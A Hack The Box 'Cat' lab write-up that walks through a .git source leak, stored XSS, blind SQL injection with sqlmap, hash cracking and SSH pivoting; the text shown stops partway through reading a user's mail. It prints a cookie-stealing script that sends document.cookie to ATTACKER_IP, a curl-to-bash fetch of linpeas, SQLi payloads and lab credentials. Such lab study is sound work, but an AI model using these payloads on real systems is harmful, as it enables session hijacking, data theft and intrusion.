---
title: "🐈 HTB Cat Write-up"
name: Cat
date: 2025-07-06
difficulty: Medium
os: Linux
skills: "Enumeration, Website Fuzzing, Stored XSS, Session Hijacking, SQL Injection, Password Cracking, Privilege Escalation, SSH Local Port Forwarding, Password Reuse"
tools: "rustscan, nmap, ffuf, sqlmap, hashcat, searchsploit, CVE-2024-6886, ssh"
published: true
---

![](images/Pasted%20image%2020250701185720.png)

## 🐾 Summary

The Cat machine was a multi-stage challenge blending classic web vulnerabilities with subtle post-exploitation pivots. 

The initial foothold came from something many devs overlook—a publicly exposed `.git` directory. 
This gifted me the full site source code, revealing several vulnerabilities:
1. **Stored XSS** via the unsanitized `username` parameter in `join.php`, which was later reflected in `view_cat.php`.
2. **Sensitive credentials** were exposed through GET requests to `join.php`, leaking login data into the Apache logs.
3. The **`HttpOnly` flag was disabled** on cookies, allowing JavaScript to access session tokens.
4. A **blind SQL injection** vulnerability in `accept_cat.php` was only accessible to admin user Axel.

Combining these, I registered a user with an XSS payload in the `username`, submitted a cat entry, and waited for Axel to review it. Once he did, the payload triggered and exfiltrated his session cookie.

Using Axel’s session, I exploited the SQLi vulnerability to dump the `users` table, cracked Rosa’s MD5-hashed password, and SSH’d in.

Post-exploitation revealed Rosa belonged to the `adm` group, giving her read access to Apache logs—where Axel’s credentials were sitting in plain text, thanks to GET-based login. With those creds, I escalated to Axel via SSH.

Axel’s emails hinted at an internal Gitea instance accessible only from localhost. SSH port forwarding revealed it was running **Gitea 1.22.0**, vulnerable to **CVE-2024-6886**, a stored XSS exploit.

I crafted a malicious repo with a payload in the Description, knowing Jobert would eventually click it from the e-mail I sent him. The XSS fetched private files from a repo called `Employee-management`—including a `README.md` hinting at a login and eventually an `index.php` file with hardcoded admin credentials.

Using those creds with `su -` rooted the box. 🎉

## 🐱 Cat Contest website

### 🔎 Recon

**Initial scan** revealed only two ports open:
- `22/tcp`: OpenSSH 8.2
- `80/tcp`: Apache HTTP Server 2.4.41

```
fcoomans@kali:~/htb/cat$ rustscan -a 10.10.11.53 --tries 5 --ulimit 10000 -- -sCV -oA cat_tcp_all
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: allowing you to send UDP packets into the void 1200x faster than NMAP

[~] The config file is expected to be at "/home/fcoomans/.rustscan.toml"
[~] Automatically increasing ulimit value to 10000.
Open 10.10.11.53:22
Open 10.10.11.53:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sCV -oA cat_tcp_all" on ip 10.10.11.53
Depending on the complexity of the script, results may take some time to appear.

<SNIP>

Nmap scan report for 10.10.11.53
Host is up, received timestamp-reply ttl 63 (0.17s latency).
Scanned at 2025-07-02 01:32:09 SAST for 12s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 96:2d:f5:c6:f6:9f:59:60:e5:65:85:ab:49:e4:76:14 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/7/gBYFf93Ljst5b58XeNKd53hjhC57SgmM9qFvMACECVK0r/Z11ho0Z2xy6i9R5dX2G/HAlIfcu6i2QD9lILOnBmSaHZ22HCjjQKzSbbrnlcIcaEZiE011qtkVmtCd2e5zeVUltA9WCD69pco7BM29OU7FlnMN0iRlF8u962CaRnD4jni/zuiG5C2fcrTHWBxc/RIRELrfJpS3AjJCgEptaa7fsH/XfmOHEkNwOL0ZK0/tdbutmcwWf9dDjV6opyg4IK73UNIJSSak0UXHcCpv0GduF3fep3hmjEwkBgTg/EeZO1IekGssI7yCr0VxvJVz/Gav+snOZ/A1inA5EMqYHGK07B41+0rZo+EZZNbuxlNw/YLQAGuC5tOHt896wZ9tnFeqp3CpFdm2rPGUtFW0jogdda1pRmRy5CNQTPDd6kdtdrZYKqHIWfURmzqva7byzQ1YPjhI22cQ49M79A0yf4yOCPrGlNNzeNJkeZM/LU6p7rNJKxE9CuBAEoyh0=
|   256 9e:c4:a4:40:e9:da:cc:62:d1:d6:5a:2f:9e:7b:d4:aa (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEmL+UFD1eC5+aMAOZGipV3cuvXzPFlhqtKj7yVlVwXFN92zXioVTMYVBaivGHf3xmPFInqiVmvsOy3w4TsRja4=
|   256 6e:22:2a:6a:6d:eb:de:19:b7:16:97:c2:7e:89:29:d5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEOCpb672fivSz3OLXzut3bkFzO4l6xH57aWuSu4RikE
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://cat.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

<SNIP>
```

After pointing `cat.htb` in `/etc/hosts`,
```
fcoomans@kali:~/htb/cat$ grep cat /etc/hosts
10.10.11.53     cat.htb
```

Fuzzing uncovered a juicy `.git/` directory. That’s an immediate red flag—and a common misstep.
```
fcoomans@kali:~/htb/cat$ ffuf -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt:FUZZ -u http://cat.htb/FUZZ -ic -t 60 -fs 272

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cat.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/quickhits.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 60
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 272
________________________________________________

.git                    [Status: 301, Size: 301, Words: 20, Lines: 10, Duration: 156ms]
.git/config             [Status: 200, Size: 92, Words: 9, Lines: 6, Duration: 157ms]
.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2, Duration: 158ms]
.git/index              [Status: 200, Size: 1726, Words: 10, Lines: 10, Duration: 158ms]
.git/logs/HEAD          [Status: 200, Size: 150, Words: 9, Lines: 2, Duration: 157ms]
.git/logs/refs          [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 157ms]
admin.php               [Status: 302, Size: 1, Words: 1, Lines: 2, Duration: 156ms]
config.php              [Status: 200, Size: 1, Words: 1, Lines: 2, Duration: 157ms]
:: Progress: [2565/2565] :: Job [1/1] :: 382 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
```

With `git-dumper` (https://github.com/arthaud/git-dumper), I pulled the full Git repo and began analyzing the PHP source code. The findings were... feline-level catastrophic.
```
fcoomans@kali:~/htb/cat$ git-dumper http://cat.htb git
[-] Testing http://cat.htb/.git/HEAD [200]
[-] Testing http://cat.htb/.git/ [403]
[-] Fetching common files
[-] Fetching http://cat.htb/.git/description [200]
[-] Fetching http://cat.htb/.gitignore [404]

<SNIP>

[-] Finding packs
[-] Finding objects
[-] Fetching objects
[-] Fetching http://cat.htb/.git/objects/9a/dbf70baf0e260d84d9c8666a0460e75e8be4a8 [200]
[-] Fetching http://cat.htb/.git/objects/0c/be0133fb00b13165bd7318e42e17f322daac7f [200]
[-] Fetching http://cat.htb/.git/objects/64/d98c5af736de120e17eff23b17e22aad668718 [200]
[-] Fetching http://cat.htb/.git/objects/91/92afa265e9e73f533227e4f118f882615d3640 [200]
[-] Fetching http://cat.htb/.git/objects/26/bd62c92bcf4415f2b82514bbbac83936c53cb5 [200]
[-] Fetching http://cat.htb/.git/objects/b7/df8d295f9356332f9619ae5ecec3230a880ef2 [200]
[-] Fetching http://cat.htb/.git/objects/58/62718ef94b524f3e36627e6f2eae1e3570a7f4 [200]
[-] Fetching http://cat.htb/.git/objects/38/660821153b31dbbee89396eacf974c095ab0dc [200]
[-] Fetching http://cat.htb/.git/objects/09/7745b30047ab3d3e6e0c5239c2dfd5cac308a5 [200]
[-] Fetching http://cat.htb/.git/objects/00/00000000000000000000000000000000000000 [404]
[-] http://cat.htb/.git/objects/00/00000000000000000000000000000000000000 responded with status code 404
[-] Fetching http://cat.htb/.git/objects/56/03bb235ee634e1d7914def967c26f9dd0963bb [200]
[-] Fetching http://cat.htb/.git/objects/8c/2c2701eb4e3c9a42162cfb7b681b6166287fd5 [200]
[-] Fetching http://cat.htb/.git/objects/b8/7b8c6317f8e419dac2c3ce3517a6c93b235028 [200]
[-] Fetching http://cat.htb/.git/objects/31/e87489c5f8160f895e941d00087bea94f21315 [200]
[-] Fetching http://cat.htb/.git/objects/88/12266cb97013f416c175f9a9fa08aae524c92a [200]
[-] Fetching http://cat.htb/.git/objects/48/21d0cd8fecc8c3579be5735b1aab69f1637c86 [200]
[-] Fetching http://cat.htb/.git/objects/9b/e1a76f22449a7876a712d34dc092f477169c36 [200]
[-] Fetching http://cat.htb/.git/objects/c9/e281ffb3f5431800332021326ba5e97aeb2764 [200]
[-] Fetching http://cat.htb/.git/objects/6f/ae98c9ae65a9ecbf37e821e7bafb48bcdac2bc [200]
[-] Fetching http://cat.htb/.git/objects/0f/fa90ae01a4f353aa2f6b2de03c212943412222 [200]
[-] Fetching http://cat.htb/.git/objects/cf/8166a8873d413e6afd88fa03305880e795a2c6 [200]
[-] Fetching http://cat.htb/.git/objects/7b/a662bf012ce71d0db9e86c80386b7ae0a54ea1 [200]
[-] Running git checkout .
```

#### 🚨 Vulnerabilities in Source Code

Enumerating the PHP files under `git` reveals two attack vectors:

##### 🔐 SQL Injection in `accept_cat.php`

Inside `accept_cat.php`, the `catName` parameter is directly concatenated into a SQL query (line 10). No sanitization, no prepared statements—just wide open.

Only user Axel can hit this endpoint (line 5), so session hijacking will be our golden ticket later.

`accept_cat.php`:
```php
     1  <?php
     2  include 'config.php';
     3  session_start();
     4
     5  if (isset($_SESSION['username']) && $_SESSION['username'] === 'axel') {
     6      if ($_SERVER["REQUEST_METHOD"] == "POST") {
     7          if (isset($_POST['catId']) && isset($_POST['catName'])) {
     8              $cat_name = $_POST['catName'];
     9              $catId = $_POST['catId'];
    10              $sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
    11              $pdo->exec($sql_insert);
    12
    13              $stmt_delete = $pdo->prepare("DELETE FROM cats WHERE cat_id = :cat_id");
    14              $stmt_delete->bindParam(':cat_id', $catId, PDO::PARAM_INT);
    15              $stmt_delete->execute();
    16
    17              echo "The cat has been accepted and added successfully.";
    18          } else {
    19              echo "Error: Cat ID or Cat Name not provided.";
    20          }
    21      } else {
    22          header("Location: /");
    23          exit();
    24      }
    25  } else {
    26      echo "Access denied.";
    27  }
    28  ?>
```

##### 🪞 Stored XSS in `join.php` + `view_cat.php`

`join.php` accepts the `username` parameter via GET (line 11). It inserts the value directly into the `users` table without (lines 11 and 22-25) any sanitization. This becomes a classic **stored XSS**, as that username is later echoed unescaped in `view_cat.php`.

`join.php`:
```php
     9  // Registration process
    10  if ($_SERVER["REQUEST_METHOD"] == "GET" && isset($_GET['registerForm'])) {
    11      $username = $_GET['username'];
    12      $email = $_GET['email'];
    13      $password = md5($_GET['password']);
    14
    15      $stmt_check = $pdo->prepare("SELECT * FROM users WHERE username = :username OR email = :email");
    16      $stmt_check->execute([':username' => $username, ':email' => $email]);
    17      $existing_user = $stmt_check->fetch(PDO::FETCH_ASSOC);
    18
    19      if ($existing_user) {
    20          $error_message = "Error: Username or email already exists.";
    21      } else {
    22          $stmt_insert = $pdo->prepare("INSERT INTO users (username, email, password) VALUES (:username, :email, :password)");
    23          $stmt_insert->execute([':username' => $username, ':email' => $email, ':password' => $password]);
    24
    25          if ($stmt_insert) {
    26              $success_message = "Registration successful!";
    27          } else {
    28              $error_message = "Error: Unable to register user.";
    29          }
    30      }
    31  }
```

Only Axel can view cats (`view_cat.php`), which is where the XSS gets triggered (lines 17-23 and line 92). If I can lure him into viewing the malicious cat entry, I can hijack his session.

`view_cat.php`
```php
    15  if ($cat_id) {
    16      // Prepare and execute the query
    17      $query = "SELECT cats.*, users.username FROM cats JOIN users ON cats.owner_username = users.username WHERE cat_id = :cat_id";
    18      $statement = $pdo->prepare($query);
    19      $statement->bindParam(':cat_id', $cat_id, PDO::PARAM_INT);
    20      $statement->execute();
    21
    22      // Fetch cat data from the database
    23      $cat = $statement->fetch(PDO::FETCH_ASSOC);
    24
    25      if (!$cat) {
    26          die("Cat not found.");
    27      }
    28  } else {
    29      die("Invalid cat ID.");
    30  }
    31  ?>
	
    84  <div class="container">
    85      <h1>Cat Details: <?php echo $cat['cat_name']; ?></h1>
    86      <img src="<?php echo $cat['photo_path']; ?>" alt="<?php echo $cat['cat_name']; ?>" class="cat-photo">
    87      <div class="cat-info">
    88          <strong>Name:</strong> <?php echo $cat['cat_name']; ?><br>
    89          <strong>Age:</strong> <?php echo $cat['age']; ?><br>
    90          <strong>Birthdate:</strong> <?php echo $cat['birthdate']; ?><br>
    91          <strong>Weight:</strong> <?php echo $cat['weight']; ?> kg<br>
    92          <strong>Owner:</strong> <?php echo $cat['username']; ?><br>
    93          <strong>Created At:</strong> <?php echo $cat['created_at']; ?>
    94      </div>
    95  </div>
```

##### 🍪 Cookie Security

Cookies lacked the `HttpOnly` flag, making them accessible via JavaScript—essential for our XSS exfiltration.

![](images/Pasted%20image%2020250701123948.png)

The plan is to:
1. Register a user on `join.php` with a `username` that contains an XSS payload.
2. Register a cat for the Contest using `contest.php`.
3. When the admin (`axel`) opens `admin.php` and selects `view_cat.php`, then the `username` is read from the database and the XSS payload is injected into the page.  The XSS payload is executed and `axel`'s cookie is stolen.
4. Use `sqlmap` with `axel`'s `PHPSESSID` cookie to test for SQLi in the `catName` parameter on `accept_cat.php`.  The `users` table from the SQLite database is dumped, revealing the user password hashes.

### 🧪 Exploitation

#### 🎣 Stored XSS → Session Hijack

I crafted a user with this payload as the `username`:
```js
<script>document.location='http://ATTACKER_IP:8000/cookie='+btoa(document.cookie)</script>
```

And started a web server on the attack host.
```
fcoomans@kali:~/htb/cat$ python -m http.server -d www
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

![](images/Pasted%20image%2020250701124635.png)

My cat is registered for the contest.

![](images/Pasted%20image%2020250701130734.png)

Once Axel viewed my cat entry, the cookie is sent to the web server on the attack host.  
```
fcoomans@kali:~/htb/cat$ python -m http.server -d www
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.53 - - [01/Jul/2025 20:13:48] code 404, message File not found
10.10.11.53 - - [01/Jul/2025 20:13:48] "GET /cookie=UEhQU0VTU0lEPXBkaXQ1cDBhaGoxdHF0cG5xbW1raGpmNmk3 HTTP/1.1" 404 -
10.10.11.53 - - [01/Jul/2025 20:13:49] code 404, message File not found
10.10.11.53 - - [01/Jul/2025 20:13:49] "GET /favicon.ico HTTP/1.1" 404 -
```

I base64-decode it into a valid PHP session.
```
fcoomans@kali:~/htb/cat$ echo -n UEhQU0VTU0lEPXBkaXQ1cDBhaGoxdHF0cG5xbW1raGpmNmk3 |base64 -d
PHPSESSID=pdit5p0ahj1tqtpnqmmkhjf6i7
```

#### 💉 SQL Injection via `sqlmap`

Armed with Axel's session, I used `sqlmap` to dump the `users` table through the vulnerable `catName` parameter:
```
fcoomans@kali:~/htb/cat$ sqlmap --cookie="PHPSESSID=pdit5p0ahj1tqtpnqmmkhjf6i7" -u http://cat.htb/accept_cat.php --method=POST --data="catName=Cat*&catId=1" --dbms=sqlite --level=5 --risk=3 --technique=BT --batch --threads=10 -T users --dump
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.9.4#stable}
|_ -| . [)]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:15:31 /2025-07-01/

custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
[20:15:32] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: catName=Fluffy'||(SELECT CHAR(101,85,82,71) WHERE 2596=2596 AND 4431=4431)||'&catId=1

    Type: time-based blind
    Title: SQLite > 2.0 AND time-based blind (heavy query)
    Payload: catName=Fluffy'||(SELECT CHAR(104,71,80,107) WHERE 1459=1459 AND 7987=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))))||'&catId=1
---
[20:15:32] [INFO] testing SQLite
[20:15:32] [INFO] confirming SQLite
[20:15:32] [INFO] actively fingerprinting SQLite
[20:15:32] [INFO] the back-end DBMS is SQLite
web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: SQLite

<SNIP>

Table: users
[11 entries]
+---------+-------------------------------+-----------------------------------------+---------------------------------------------------------------------------------------------+
| user_id | email                         | password                                | username                                                                                    |
+---------+-------------------------------+-----------------------------------------+---------------------------------------------------------------------------------------------+
| 1       | axel2017@gmail.com            | d1bbba3670feb9435c9841e46e60ee2f        | axel                                                                                        |
| 2       | rosamendoza485@gmail.com      | ac369922d560f17d6eeb8b2c7dec498c        | rosa                                                                                        |
| 3       | robertcervantes2000@gmail.com | 42846631708f69c00ec0c0a8aa4a92ad        | robert                                                                                      |
| 4       | fabiancarachure2323@gmail.com | 39e153e825c4a3d314a0dc7f7475ddbe        | fabian                                                                                      |
| 5       | jerrysonC343@gmail.com        | 781593e060f8d065cd7281c5ec5b4b86        | jerryson                                                                                    |
| 6       | larryP5656@gmail.com          | 1b6dce240bbfbc0905a664ad199e18f8        | larry                                                                                       |
| 7       | royer.royer2323@gmail.com     | c598f6b844a36fa7836fba0835f1f6          | royer                                                                                       |
| 8       | peterCC456@gmail.com          | e41ccefa439fc454f7eadbf1f139ed8a        | peter                                                                                       |
| 9       | angel234g@gmail.com           | 24a8ec003ac2e1b3c5953a6f95f8f565        | angel                                                                                       |
| 10      | jobert2020@gmail.com          | 88e4dceccd48820cf77b5cf6c08698ad        | jobert                                                                                      |
| 11      | user@example.com              | 1a1dc91c907325c69271ddf0c944bc72        | <script>document.location='http://ATTACKER_IP:8000/cookie='+btoa(document.cookie)</script> |
+---------+-------------------------------+-----------------------------------------+---------------------------------------------------------------------------------------------+

[20:15:40] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/fcoomans/.local/share/sqlmap/output/cat.htb/dump/SQLite_masterdb/users.csv'

[*] ending @ 20:15:40 /2025-07-01/
```

`sqlmap` dumps the table to a CSV file.
```
fcoomans@kali:~/htb/cat$ cat /home/fcoomans/.local/share/sqlmap/output/cat.htb/dump/SQLite_masterdb/users.csv
user_id,email,password,username
1,axel2017@gmail.com,d1bbba3670feb9435c9841e46e60ee2f,axel
2,rosamendoza485@gmail.com,ac369922d560f17d6eeb8b2c7dec498c,rosa
3,robertcervantes2000@gmail.com,42846631708f69c00ec0c0a8aa4a92ad,robert
4,fabiancarachure2323@gmail.com,39e153e825c4a3d314a0dc7f7475ddbe,fabian
5,jerrysonC343@gmail.com,781593e060f8d065cd7281c5ec5b4b86,jerryson
6,larryP5656@gmail.com,1b6dce240bbfbc0905a664ad199e18f8,larry
7,royer.royer2323@gmail.com,c598f6b844a36fa7836fba0835f1f6,royer
8,peterCC456@gmail.com,e41ccefa439fc454f7eadbf1f139ed8a,peter
9,angel234g@gmail.com,24a8ec003ac2e1b3c5953a6f95f8f565,angel
10,jobert2020@gmail.com,88e4dceccd48820cf77b5cf6c08698ad,jobert
11,user@example.com,1a1dc91c907325c69271ddf0c944bc72,<script>document.location='http://ATTACKER_IP:8000/cookie='+btoa(document.cookie)</script>
```

`cut` is used to cut out the third column, which contains the password hashes.
```
fcoomans@kali:~/htb/cat$ grep -v "user@example.com" /home/fcoomans/.local/share/sqlmap/output/cat.htb/dump/SQLite_masterdb/users.csv |cut -d, -f3
password
d1bbba3670feb9435c9841e46e60ee2f
ac369922d560f17d6eeb8b2c7dec498c
42846631708f69c00ec0c0a8aa4a92ad
39e153e825c4a3d314a0dc7f7475ddbe
781593e060f8d065cd7281c5ec5b4b86
1b6dce240bbfbc0905a664ad199e18f8
c598f6b844a36fa7836fba0835f1f6
e41ccefa439fc454f7eadbf1f139ed8a
24a8ec003ac2e1b3c5953a6f95f8f565
88e4dceccd48820cf77b5cf6c08698ad

fcoomans@kali:~/htb/cat$ grep -v "user@example.com" /home/fcoomans/.local/share/sqlmap/output/cat.htb/dump/SQLite_masterdb/users.csv |cut -d, -f3 >hashes.txt
```

`join.php` shows on lines 13 and 36 that the dumped passwords were simple MD5 hashes.
```php
    13      $password = md5($_GET['password']);
    36      $password = md5($_GET['loginPassword']);
```

A quick `hashcat` run cracked Rosa’s password: `soyunaprincesarosa`.
```
fcoomans@kali:~/htb/cat$ hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

ac369922d560f17d6eeb8b2c7dec498c:soyunaprincesarosa
<SNIP>
```

#### 👣 Foothold as Rosa

SSH’d into the box as `rosa`.
```
fcoomans@kali:~/htb/cat$ ssh rosa@cat.htb
rosa@cat.htb's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-204-generic x86_64)

<SNIP>

rosa@cat:~$ id
uid=1001(rosa) gid=1001(rosa) groups=1001(rosa),4(adm)
rosa@cat:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:94:7d:3d brd ff:ff:ff:ff:ff:ff
    inet 10.10.11.53/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe94:7d3d/64 scope link
       valid_lft forever preferred_lft forever
```

`linpeas.sh` (part of the `peass` package on Kali) is shared using a Python web server on the attacker host.
```
fcoomans@kali:~/htb/cat$ locate linpeas.sh
/usr/share/peass/linpeas/linpeas.sh

fcoomans@kali:~/htb/cat$ dpkg -S /usr/share/peass/linpeas/linpeas.sh
peass: /usr/share/peass/linpeas/linpeas.sh

fcoomans@kali:~/htb/cat$ python -m http.server -d /usr/share/peass/linpeas/
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Though not the flag owner, she belonged to the `adm` group—meaning she could read system logs.
```
rosa@cat:~$ curl -s http://ATTACKER_IP:8000/linpeas.sh |bash -

<SNIP>

                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════
                               ╚═══════════════════╝
OS: Linux version 5.4.0-204-generic (buildd@lcy02-amd64-079) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)) #224-Ubuntu SMP Thu Dec 5 13:38:28 UTC 2024
User & Groups: uid=1001(rosa) gid=1001(rosa) groups=1001(rosa),4(adm)
Hostname: cat

<SNIP>

╔══════════╣ Users with console
axel:x:1000:1000:axel:/home/axel:/bin/bash
git:x:114:119:Git Version Control,,,:/home/git:/bin/bash
jobert:x:1002:1002:,,,:/home/jobert:/bin/bash
root:x:0:0:root:/root:/bin/bash
rosa:x:1001:1001:,,,:/home/rosa:/bin/bash

<SNIP>

╔══════════╣ Analyzing Interesting logs Files (limit 70)
-rw-r----- 1 root adm 2400859 Jul  1 12:02 /var/log/apache2/access.log

-rw-r----- 1 root adm 1373551 Jul  1 11:37 /var/log/apache2/error.log

<SNIP>

╔══════════╣ Readable files belonging to root and readable by me but not world readable

<SNIP>

-rw-r----- 1 root adm 80192501 Jun 30 16:25 /var/log/apache2/access.log
-rw-r----- 1 root adm 724 Jan 30 15:40 /var/log/apache2/access.log.2.gz
-rw-r----- 1 root adm 346 Jan 31 11:48 /var/log/apache2/error.log.1
-rw-r----- 1 root adm 2545780 Jun 30 16:17 /var/log/apache2/error.log
-rw-r----- 1 root adm 351 Jan 30 15:40 /var/log/apache2/error.log.2.gz
-rw-r----- 1 root adm 0 Jan 21 12:34 /var/log/apache2/other_vhosts_access.log
-rw-r----- 1 root adm 185192 Jan 31 11:48 /var/log/apache2/access.log.1

<SNIP>

╔══════════╣ Mails (limit 50)
     3839      4 -rw-rw----   1 axel     mail         1961 Jan 14 16:49 /var/mail/axel
     3872      0 -rw-rw----   1 jobert   mail            0 Jun 30 11:09 /var/mail/jobert
    29987    144 -rw-------   1 root     mail       143259 Jun 30 16:25 /var/mail/root
     3839      4 -rw-rw----   1 axel     mail         1961 Jan 14 16:49 /var/spool/mail/axel
     3872      0 -rw-rw----   1 jobert   mail            0 Jun 30 11:09 /var/spool/mail/jobert
    29987    144 -rw-------   1 root     mail       143259 Jun 30 16:25 /var/spool/mail/root

<SNIP>
```

Sure enough, browsing Apache access logs revealed Axel's login GET request, exposing his password as `aNdZwgC4tI9gnVXv_e3Q`.
```
rosa@cat:~$ zcat  /var/log/apache2/access.log* |grep axel

gzip: /var/log/apache2/access.log: not in gzip format

gzip: /var/log/apache2/access.log.1: not in gzip format
127.0.0.1 - - [30/Jan/2025:15:33:30 +0000] "GET /join.php?loginUsername=axel&loginPassword=aNdZwgC4tI9gnVXv_e3Q&loginForm=Login HTTP/1.1" 302 329 "http://cat.htb/join.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0"
127.0.0.1 - - [30/Jan/2025:15:33:41 +0000] "GET /join.php?loginUsername=axel&loginPassword=aNdZwgC4tI9gnVXv_e3Q&loginForm=Login HTTP/1.1" 302 329 "http://cat.htb/join.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0"
<SNIP>
```

### 💰 Post Exploitation
#### 🔼 Priv Esc to Axel

 I used Axel’s credentials to SSH in and was greeted with `You have mail`.
```
fcoomans@kali:~/htb/cat$ ssh axel@cat.htb
axel@cat.htb's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-204-generic x86_64)

<SNIP>

You have mail.

axel@cat:~$ id
uid=1000(axel) gid=1000(axel) groups=1000(axel)
axel@cat:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:94:7d:3d brd ff:ff:ff:ff:ff:ff
    inet 10.10.11.53/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe94:7d3d/64 scope link
       valid_lft forever preferred_lft forever
```

And in this game, you always read the mail.
```
axel@cat:~$ cat /var/spool/mail/axel
From rosa@cat.htb  Sat Sep 28 04:51:50 2024
Return-Path: <rosa@cat.htb>
Received: from cat.htb (localhost [127.0.0.1])
        by cat.htb (8.15.2/8.15.2/Debian-18) with ESMTP id 48S4pnXk001592
        for <axel@cat.htb>; Sat, 28 Sep 2024 04:51:50 GMT
Received: (from rosa@localhost)
        by cat.htb (8.15.2/8.15.2/Submit) id 48S4pnlT001591
        for axel@localhost; Sat, 28 Sep 2024 04:51:49 GMT
Date: Sat, 28 Sep 2024 04:51:49 GMT
From: rosa@cat.htb
Message-Id: <202409280451.48S4pnlT001591@cat.htb>
Subject: New cat services

Hi Axel,

We are planning to launch new cat-related web services, including a cat care website and other projects. Please send an email to jobert@localhost with information about your Gitea repository. Jobert will check if it is a promising service that we can develop.

Important note: Be sure to include a clear description of the idea so that I can understand it properly. I will review the whole repository.

From rosa@cat.htb  Sat Sep 28 05:05:28 2024
Return-Path: <rosa@cat.htb>
Received: from cat.htb (localhost [127.0.0.1])
        by cat.htb (8.15.2/8.15.2/Debian-18) with ESMTP id 48S55SRY002268
        for <axel@cat.htb>; Sat, 28 Sep 2024 05:05:28 GMT
Received: (from rosa@localhost)
        by cat.htb (8.15.2/8.15.2/Submit) id 48S55Sm0002267
        for axel@localhost; Sat, 28 Sep 2024 05:05:28 GMT
Date: Sat, 28 Sep 2024 05:05:28 GMT
From: rosa@cat.htb
Message-Id: <202409280505.48S55Sm0002267@cat.htb>
Subject: Employee management

